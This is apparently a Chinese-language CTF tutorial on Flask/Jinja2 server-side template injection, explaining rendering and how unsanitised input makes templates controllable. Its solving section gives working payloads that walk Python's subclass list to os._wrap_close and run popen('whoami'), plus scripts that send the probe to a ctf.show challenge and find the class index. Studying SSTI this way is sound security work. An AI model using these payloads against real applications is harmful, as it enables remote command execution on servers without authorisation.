# SSTI

<br>

## Flask模板注入

ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。

<br>

### 模板渲染

让我们用例子来简析模板渲染。

````
<html>
<div>{$what}</div>
</html>
````

我们想要呈现在每个用户面前自己的名字。但是{$what}我们不知道用户名字是什么，用一些url或者cookie包含的信息，渲染到what变量里，呈现给用户的为

````
<html>
<div>张三</div>
</html>
````

当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。

<br>

### 重要函数

#### render_template函数

<img src="https://54huarui.github.io/blogs/falsk/p1.png" width="880" height="480">

#### regquest.arg.get('a')函数

通过get的方式获得请求

#### render_template_string函数

多用于ctf赛题里，用于渲染字符串，可以直接定义网页内容
<img src="https://54huarui.github.io/blogs/falsk/p3.png" width="880" height="480">

#### url_for()函数

用来构建url

#### redirect()函数

用来重定向网站


<br>


### 成因

例子：

````
<html>
  <head>
    <title>{{title}} - 小猪佩奇</title>
  </head>
 <body>
      <h1>Hello, {{user.name}}!</h1>
  </body>
</html>
````

里面有两个参数需要我们渲染，user.name，以及title

我们在app.py文件里进行渲染。


````
@app.route('/')
@app.route('/index')#我们访问/或者/index都会跳转
def index():
   return render_template("index.html",title='Home',user=request.args.get("key"))
````

<br>

## 解题思路

<br>

1.找到模板注入点

2.先查看所有的子类

<br>

````

{{"".__class__.__bases__[0].__subclasses__()}}


````

<br>

然后寻找可用子类并且获得它的序号
````
import requests
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def crawl(url):
    try:
        # 发送请求
        response = requests.get(url, verify=False)

        # 检查请求是否成功
        if response.status_code == 200:
            # 返回网页的HTML内容
            return response.text
        else:
            print(f"请求失败，状态码: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"请求发生异常: {e}")
        return None


def truncate_at_string(text, target_string):
    # 找到目标字符串在文本中的位置
    pos = text.find(target_string)
    if pos == -1:
        return "目标字符串未找到"

    # 截取文本至目标字符串位置（不包括目标字符串本身）
    truncated_text = text[:pos]

    return truncated_text

def count_substring_occurrences(text, substring):
    # 使用 count 方法统计子字符串出现的次数
    count = text.count(substring)
    return count


#确定寻找的子类
target_string = "os._wrap_close"

url = b"https://d2da0681-9d65-4e0b-8a88-64c4a7cf0ab0.challenge.ctf.show/hello/%7B%7B%22%22.__class__.__bases__[0].__subclasses__()%7D%7D"
html_content = crawl(url)
te = truncate_at_string(html_content, target_string)

#开始数
stringwant = "&#39"
mem = count_substring_occurrences(te,stringwant)
print (f"你想要找到的子类{target_string}列表号是")
print((mem-1)/2)

#print(te)

#if html_content:
#    print(f"全部子类:\n{html_content}")


````

<br>


这里我获得的序号是132

<br>

3.命令执行


````

{{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()}}

````

<br>

## 更简单的通用脚本，复制粘贴a的值即可

<br>

````
我们首先把所有的子类列举出来
{{().__class__.__bases__[0].__subclasses__()}}
然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类
import json
a = """
<class 'type'>,...,<class 'subprocess.Popen'>
"""
num = 0
allList = []
result = ""
for i in a:
    if i == ">":
        result += i
        allList.append(result)
        result = ""
    elif i == "\n" or i == ",":
        continue
    else:
        result += i

for k,v in enumerate(allList):
    if "os._wrap_close" in v:
        print(str(k)+"--->"+v)

````










